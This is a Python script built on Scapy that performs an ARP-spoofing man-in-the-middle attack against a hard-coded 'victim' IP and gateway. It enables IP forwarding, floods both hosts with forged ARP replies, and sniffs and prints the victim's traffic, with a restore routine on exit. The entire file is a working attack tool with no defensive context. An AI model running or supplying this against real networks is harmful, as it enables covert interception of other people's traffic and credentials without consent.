from scapy.all import srp, Ether, ARP, send, sniff
import os
import sys
import threading
import time

# IP addresses
victim_ip = "192.168.1.3"
gateway_ip = "192.168.2.1"

# MAC addresses (will be fetched dynamically)
victim_mac = None
gateway_mac = None

# Function to get the MAC address for a given IP
def get_mac(ip):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None

# Function to poison the victim and the gateway
def poison(victim_ip, victim_mac, gateway_ip, gateway_mac):
    poison_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac)
    poison_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac)
    print("[*] Starting the ARP poisoning. [CTRL+C to stop]")
    
    while True:
        send(poison_victim)
        send(poison_gateway)
        time.sleep(2)

# Function to restore the ARP tables to their original state
def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    print("[*] Restoring the network")
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=gateway_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=victim_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
    print("[*] ARP tables restored")

# Function to enable IP forwarding
def enable_ip_forwarding():
    if os.name == "nt":
        os.system("netsh interface ipv4 set interface 1 forwarding=enabled")
    else:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP forwarding enabled")

# Function to disable IP forwarding
def disable_ip_forwarding():
    if os.name == "nt":
        os.system("netsh interface ipv4 set interface 1 forwarding=disabled")
    else:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP forwarding disabled")

# Function to sniff packets
def packet_sniffer():
    sniff(filter="ip host " + victim_ip, prn=lambda x: x.show())

if __name__ == "__main__":
    try:
        print("[*] Getting MAC addresses...")
        victim_mac = get_mac(victim_ip)
        gateway_mac = get_mac(gateway_ip)

        if victim_mac is None or gateway_mac is None:
            print("[!] Could not get MAC addresses. Exiting...")
            sys.exit(1)
        
        print(f"[*] Victim MAC: {victim_mac}")
        print(f"[*] Gateway MAC: {gateway_mac}")

        enable_ip_forwarding()

        # Start ARP poisoning in a separate thread
        poison_thread = threading.Thread(target=poison, args=(victim_ip, victim_mac, gateway_ip, gateway_mac))
        poison_thread.start()

        # Start packet sniffer
        print("[*] Starting packet sniffer. [CTRL+C to stop]")
        packet_sniffer()

    except KeyboardInterrupt:
        print("[*] Stopping the script...")
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        disable_ip_forwarding()
        sys.exit(0)
